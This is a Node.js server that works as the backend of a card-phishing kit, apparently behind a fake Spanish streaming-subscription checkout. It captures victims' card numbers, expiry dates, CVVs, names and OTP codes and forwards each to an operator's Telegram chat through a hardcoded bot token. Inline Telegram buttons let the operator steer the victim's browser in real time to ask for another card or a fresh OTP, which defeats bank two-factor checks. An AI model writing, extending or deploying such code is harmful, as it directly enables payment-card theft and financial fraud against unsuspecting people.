const express = require('express');
const http = require('http');
const socketIO = require('socket.io');
const path = require('path');
const TelegramBot = require('node-telegram-bot-api');

const app = express();
const server = http.createServer(app);
const io = socketIO(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});

// Telegram Bot Configuration
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || '7244927485:AAFyWj9h6o33uVb7TgaaawKvpiY8MHx-ero';
const CHAT_ID = process.env.CHAT_ID || '-5088262475';
const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });

// Middleware
app.use(express.json());
app.use(express.static(__dirname));

// Store active sessions
const activeSessions = new Map();

// Generate unique session ID
function generateSessionId() {
    return `session_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
}

// Format card data for Telegram
function formatCardMessage(data) {
    // Map plan names and prices
    const planInfo = {
        'basic': { name: 'Básico', price: '€4,99/mes' },
        'Basic': { name: 'Básico', price: '€4,99/mes' },
        'standard': { name: 'Estándar', price: '€7,99/mes' },
        'Standard': { name: 'Estándar', price: '€7,99/mes' },
        'premium': { name: 'Premium', price: '€11,99/mes' },
        'Premium': { name: 'Premium', price: '€11,99/mes' }
    };
    
    const plan = planInfo[data.plan] || { name: 'Premium', price: '44.900/mes' };
    
    return `
🔴 *NUEVA TARJETA CAPTURADA*

💳 *Datos de la Tarjeta:*
• Número: \`${data.cardNumber}\`
• Vencimiento: \`${data.expiryDate}\`
• CVV: \`${data.cvv}\`
• Nombre: \`${data.cardName}\`

💰 *Plan Seleccionado:*
• Plan: ${plan.name}
• Precio: ${plan.price}

📱 *Información de Sesión:*
• ID: \`${data.sessionId}\`
• Hora: ${new Date().toLocaleString('es-ES', { timeZone: 'Europe/Madrid' })}

⏳ *Estado:* Esperando acción...
    `.trim();
}

// Format OTP data for Telegram
function formatOTPMessage(data) {
    // Map plan names and prices
    const planInfo = {
        'basic': { name: 'Básico', price: '€4,99/mes' },
        'Basic': { name: 'Básico', price: '€4,99/mes' },
        'standard': { name: 'Estándar', price: '€7,99/mes' },
        'Standard': { name: 'Estándar', price: '€7,99/mes' },
        'premium': { name: 'Premium', price: '€11,99/mes' },
        'Premium': { name: 'Premium', price: '€11,99/mes' }
    };
    
    const plan = planInfo[data.plan] || { name: 'Premium', price: '44.900/mes' };
    
    return `
🔐 *CÓDIGO OTP CAPTURADO*

🔢 *Código OTP:*
• Código: \`${data.otpCode}\`

💳 *Tarjeta Asociada:*
• Número: \`${data.cardNumber}\`
• Vencimiento: \`${data.expiryDate || 'N/A'}\`
• CVV: \`${data.cvv || 'N/A'}\`
• Nombre: \`${data.cardName}\`

💰 *Plan Seleccionado:*
• Plan: ${plan.name}
• Precio: ${plan.price}

📱 *Información de Sesión:*
• ID: \`${data.sessionId}\`
• Hora: ${new Date().toLocaleString('es-ES', { timeZone: 'Europe/Madrid' })}

⏳ *Estado:* OTP recibido
    `.trim();
}

// Create inline keyboard with buttons
function createKeyboard(sessionId) {
    return {
        inline_keyboard: [
            [
                {
                    text: '🔄 Pedir Tarjeta',
                    callback_data: `request_card_${sessionId}`
                },
                {
                    text: '🔐 Pedir OTP',
                    callback_data: `request_otp_${sessionId}`
                }
            ],
            [
                {
                    text: '✅ Finalizar',
                    callback_data: `finish_${sessionId}`
                }
            ]
        ]
    };
}

// Socket.IO Connection Handler
io.on('connection', (socket) => {
    console.log('New client connected:', socket.id);

    // Assign session ID
    const sessionId = generateSessionId();
    activeSessions.set(socket.id, {
        sessionId,
        socketId: socket.id,
        connectedAt: new Date(),
        cardData: null,
        otpData: null
    });

    socket.emit('session_assigned', { sessionId });

    // Handle card submission
    socket.on('submit_card', async (data) => {
        const session = activeSessions.get(socket.id);
        if (!session) return;

        const cardData = {
            ...data,
            sessionId: session.sessionId
        };

        // Store card data in session
        session.cardData = cardData;
        activeSessions.set(socket.id, session);

        try {
            // Send to Telegram
            const message = formatCardMessage(cardData);
            const keyboard = createKeyboard(session.sessionId);

            await bot.sendMessage(CHAT_ID, message, {
                parse_mode: 'Markdown',
                reply_markup: keyboard
            });

            // Notify client that data was sent
            socket.emit('card_submitted', { success: true });
        } catch (error) {
            console.error('Error sending to Telegram:', error);
            socket.emit('card_error', { error: 'Failed to submit' });
        }
    });

    // Handle OTP submission
    socket.on('submit_otp', async (data) => {
        const session = activeSessions.get(socket.id);
        if (!session) return;

        // Use data from client (which includes card data from localStorage)
        // Fallback to session data if not provided
        const otpData = {
            otpCode: data.otpCode,
            cardNumber: data.cardNumber || session.cardData?.cardNumber || 'N/A',
            expiryDate: data.expiryDate || session.cardData?.expiryDate || 'N/A',
            cvv: data.cvv || session.cardData?.cvv || 'N/A',
            cardName: data.cardName || session.cardData?.cardName || 'N/A',
            plan: data.plan || session.cardData?.plan || 'Premium',
            sessionId: session.sessionId,
            timestamp: data.timestamp
        };

        // Store OTP data in session
        session.otpData = otpData;
        activeSessions.set(socket.id, session);

        try {
            // Send to Telegram
            const message = formatOTPMessage(otpData);
            const keyboard = createKeyboard(session.sessionId);

            await bot.sendMessage(CHAT_ID, message, {
                parse_mode: 'Markdown',
                reply_markup: keyboard
            });

            // Notify client that data was sent
            socket.emit('otp_submitted', { success: true });
        } catch (error) {
            console.error('Error sending to Telegram:', error);
            socket.emit('otp_error', { error: 'Failed to submit' });
        }
    });

    // Handle disconnect
    socket.on('disconnect', () => {
        console.log('Client disconnected:', socket.id);
        // Keep session data for potential reconnection
        setTimeout(() => {
            const session = activeSessions.get(socket.id);
            if (session) {
                activeSessions.delete(socket.id);
            }
        }, 60000); // Clean up after 1 minute
    });
});

// Telegram Bot Callback Handler
bot.on('callback_query', async (callbackQuery) => {
    const data = callbackQuery.data;
    const messageId = callbackQuery.message.message_id;

    try {
        if (data.startsWith('request_card_')) {
            const sessionId = data.replace('request_card_', '');
            
            // Find socket by session ID
            let targetSocket = null;
            for (const [socketId, session] of activeSessions.entries()) {
                if (session.sessionId === sessionId) {
                    targetSocket = io.sockets.sockets.get(socketId);
                    break;
                }
            }

            if (targetSocket) {
                targetSocket.emit('redirect_to_card');
                await bot.answerCallbackQuery(callbackQuery.id, {
                    text: '🔄 Solicitando nueva tarjeta al cliente...'
                });
            } else {
                await bot.answerCallbackQuery(callbackQuery.id, {
                    text: '❌ Sesión no encontrada o expirada'
                });
            }
        } else if (data.startsWith('request_otp_')) {
            const sessionId = data.replace('request_otp_', '');
            
            // Find socket by session ID
            let targetSocket = null;
            for (const [socketId, session] of activeSessions.entries()) {
                if (session.sessionId === sessionId) {
                    targetSocket = io.sockets.sockets.get(socketId);
                    break;
                }
            }

            if (targetSocket) {
                targetSocket.emit('redirect_to_otp');
                await bot.answerCallbackQuery(callbackQuery.id, {
                    text: '🔐 Solicitando código OTP al cliente...'
                });
            } else {
                await bot.answerCallbackQuery(callbackQuery.id, {
                    text: '❌ Sesión no encontrada o expirada'
                });
            }
        } else if (data.startsWith('finish_')) {
            const sessionId = data.replace('finish_', '');
            
            // Find socket by session ID
            let targetSocket = null;
            for (const [socketId, session] of activeSessions.entries()) {
                if (session.sessionId === sessionId) {
                    targetSocket = io.sockets.sockets.get(socketId);
                    activeSessions.delete(socketId);
                    break;
                }
            }

            if (targetSocket) {
                targetSocket.emit('redirect_to_finish');
                await bot.answerCallbackQuery(callbackQuery.id, {
                    text: '✅ Finalizando sesión...'
                });
                await bot.editMessageText(
                    callbackQuery.message.text + '\n\n✅ *SESIÓN FINALIZADA*',
                    {
                        chat_id: CHAT_ID,
                        message_id: messageId,
                        parse_mode: 'Markdown'
                    }
                );
            } else {
                await bot.answerCallbackQuery(callbackQuery.id, {
                    text: '✅ Sesión finalizada'
                });
            }
        }
    } catch (error) {
        console.error('Error handling callback:', error);
        await bot.answerCallbackQuery(callbackQuery.id, {
            text: '❌ Error al procesar la acción'
        });
    }
});

// Error handler for bot
bot.on('polling_error', (error) => {
    console.error('Telegram polling error:', error);
});

// Start server
const PORT = process.env.PORT || 3000;
const HOST = process.env.HOST || '0.0.0.0';

server.listen(PORT, HOST, () => {
    console.log(`🚀 Server running on ${HOST}:${PORT}`);
    console.log(`📱 Telegram Bot is active`);
    console.log(`🔌 Socket.IO ready for connections`);
    console.log(`🌍 Environment: ${process.env.NODE_ENV || 'development'}`);
});
